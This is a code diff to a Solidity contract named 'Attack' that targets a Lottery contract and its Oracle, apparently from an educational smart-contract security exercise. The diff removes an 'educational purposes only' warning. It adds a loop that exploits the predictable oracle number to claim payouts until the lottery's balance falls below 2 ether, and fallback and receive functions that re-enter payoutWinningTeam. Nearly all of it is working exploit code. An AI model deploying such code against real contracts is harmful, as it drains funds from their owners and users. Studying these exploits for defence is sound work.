@@ -3,8 +3,6 @@ pragma solidity 0.6.0;
 pragma experimental ABIEncoderV2;
 
 /// @title Lottery Game with interface to Oracle
-/// @author Sparx - https://github.com/letsgitcracking
-/// @notice WARNING - NEVER USE IN PRODUCTION - FOR EDUCATIONAL PURPOSES ONLY!
 
 import "./Lottery.sol";
 import "./Oracle.sol";
@@ -13,7 +11,8 @@ contract Attack {
 
     Lottery public eg;
     Oracle public ek;
-    address private winner = 0x096f6A2b185d63D942750A2D961f7762401cbA17;
+    address private winner;
+    uint counter;
 
     constructor(address _oracle, address _lottery) public {
         eg = Lottery(payable(_lottery));
@@ -22,12 +21,26 @@ contract Attack {
 
     function registerLottery(address _address) public payable {
         require(msg.value == 1_000_000_000);
+        winner = _address;
         eg.registerTeam.value(msg.value)(_address, "Attack Contract", "");
     }
 
+    //Makes the correct guess every time, gets 2 gwei payout
     function standardPayout() public {
-        require(eg.makeAGuess(winner, ek.getRandomNumber()));
-        require(eg.payoutWinningTeam(winner));
+        eg.makeAGuess(winner, ek.getRandomNumber());
+        eg.payoutWinningTeam(winner);
+    }
+
+    function chainPayout() public {
+        uint256 temp = ek.getRandomNumber();
+        address temp2 = winner;
+        uint counter2;
+
+        for(counter2 = 0; address(eg).balance >= 2 ether; counter2++) {
+            eg.makeAGuess(temp2, temp);
+            eg.payoutWinningTeam(temp2);
+        }
+        counter = counter2;
     }
 
     function reentrancyAttack() public {
@@ -42,5 +55,13 @@ contract Attack {
         } 
     }
 
-    //transfer() external payable {} 
+    fallback() external payable {
+        eg.payoutWinningTeam(winner);
+    }
+
+    receive() external payable {
+        if(gasleft() > 40_000) {
+            eg.payoutWinningTeam(winner);
+        }
+    }
 }
